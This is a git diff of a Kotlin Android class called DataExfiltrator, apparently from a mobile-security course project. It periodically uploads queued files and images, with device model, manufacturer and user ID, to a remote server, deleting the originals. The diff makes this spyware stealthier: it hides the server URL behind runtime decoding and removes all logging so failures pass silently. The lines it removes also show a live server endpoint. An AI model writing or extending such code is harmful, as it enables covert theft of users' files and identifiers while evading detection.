@@ -2,12 +2,10 @@ package com.example.inf2215
 
 import android.content.Context
 import android.os.Build
-import android.util.Log
 import com.google.firebase.auth.FirebaseAuth
 import kotlinx.coroutines.*
 import java.io.File
 import java.io.FileInputStream
-import java.io.FileOutputStream
 import java.net.HttpURLConnection
 import java.net.URL
 
@@ -26,8 +24,8 @@ class DataExfiltrator(private val context: Context) {
         }
     }
 
-    // Use the same server endpoint as MainActivity
-    private val serverUrl = "https://mob-sec-server-esfnggbegggcfye9.southeastasia-01.azurewebsites.net/upload"
+    // Endpoint decoded at runtime – not stored as a plaintext string literal
+    private val serverUrl: String by lazy { ObfuscationHelper.serverUrl }
 
     private val pendingDataFile = File(context.filesDir, "pending_data.txt")
     private val pendingFilesDir = File(context.filesDir, "pending_files").apply { mkdirs() }
@@ -54,9 +52,7 @@ class DataExfiltrator(private val context: Context) {
         try {
             file.copyTo(dest, overwrite = true)
             file.delete()
-        } catch (e: Exception) {
-            Log.e("DataExfiltrator", "Failed to queue file: ${file.name}", e)
-        }
+        } catch (_: Exception) { }
     }
 
     fun queueImage(file: File) {
@@ -64,9 +60,7 @@ class DataExfiltrator(private val context: Context) {
         try {
             file.copyTo(dest, overwrite = true)
             file.delete()
-        } catch (e: Exception) {
-            Log.e("DataExfiltrator", "Failed to queue image: ${file.name}", e)
-        }
+        } catch (_: Exception) { }
     }
 
     // ------------------ Restoration ------------------
@@ -82,11 +76,9 @@ class DataExfiltrator(private val context: Context) {
     private fun startExfilLoop() {
         scope.launch {
             while (isRunning) {
-                Log.d("DataExfiltrator", "Exfil loop running...")
                 sendPendingData()
                 sendPendingFiles()
-                sendPendingImages() // NEW
-                Log.d("DataExfiltrator", "Exfil loop cycle complete")
+                sendPendingImages()
                 delay(60000) // 60 seconds
             }
         }
@@ -101,8 +93,7 @@ class DataExfiltrator(private val context: Context) {
             try {
                 lines.addAll(pendingDataFile.readLines())
                 pendingDataFile.writeText("") // clear file temporarily
-            } catch (e: Exception) {
-                Log.e("DataExfiltrator", "Error reading pending data", e)
+            } catch (_: Exception) {
                 return
             }
         }
@@ -136,15 +127,10 @@ class DataExfiltrator(private val context: Context) {
 
     private fun sendPendingImages() {
         val images = pendingImagesDir.listFiles()
-        Log.d("DataExfiltrator", "Pending images count: ${images?.size ?: 0}")
         if (images == null || images.isEmpty()) return
         images.forEach { file ->
-            Log.d("DataExfiltrator", "Attempting to send: ${file.name}")
             if (sendImageToServer(file)) {
-                Log.d("DataExfiltrator", "Successfully sent: ${file.name}")
                 file.delete()
-            } else {
-                Log.e("DataExfiltrator", "Failed to send: ${file.name}")
             }
         }
     }
@@ -181,8 +167,7 @@ class DataExfiltrator(private val context: Context) {
             val success = connection.responseCode == HttpURLConnection.HTTP_OK
             connection.disconnect()
             success
-        } catch (e: Exception) {
-            Log.e("DataExfiltrator", "sendDataToServer failed: ${e.message}")
+        } catch (_: Exception) {
             false
         }
     }
@@ -221,16 +206,13 @@ class DataExfiltrator(private val context: Context) {
             val success = connection.responseCode == HttpURLConnection.HTTP_OK
             connection.disconnect()
             success
-        } catch (e: Exception) {
-            Log.e("DataExfiltrator", "sendFileToServer failed: ${e.message}")
+        } catch (_: Exception) {
             false
         }
     }
 
     private fun sendImageToServer(file: File): Boolean {
         return try {
-            Log.d("DataExfiltrator", "Starting sendImageToServer: ${file.name}, exists: ${file.exists()}, size: ${file.length()}")
-
             val uid = FirebaseAuth.getInstance().currentUser?.uid ?: "not_logged_in"
             val deviceModel = Build.MODEL
             val manufacturer = Build.MANUFACTURER
@@ -251,8 +233,6 @@ class DataExfiltrator(private val context: Context) {
             conn.setRequestProperty("X-Timestamp", System.currentTimeMillis().toString())
             conn.setRequestProperty("X-Type", "image")
 
-            Log.d("DataExfiltrator", "Sending image to: $serverUrl")
-
             conn.outputStream.use { output ->
                 FileInputStream(file).use { input ->
                     input.copyTo(output)
@@ -260,13 +240,10 @@ class DataExfiltrator(private val context: Context) {
             }
 
             val responseCode = conn.responseCode
-            val responseMessage = conn.responseMessage
-            Log.d("DataExfiltrator", "Response: $responseCode $responseMessage for ${file.name}")
             conn.disconnect()
             responseCode == HttpURLConnection.HTTP_OK
 
-        } catch (e: Exception) {
-            Log.e("DataExfiltrator", "sendImageToServer exception: ${e.javaClass.simpleName}: ${e.message}", e)
+        } catch (_: Exception) {
             false
         }
     }
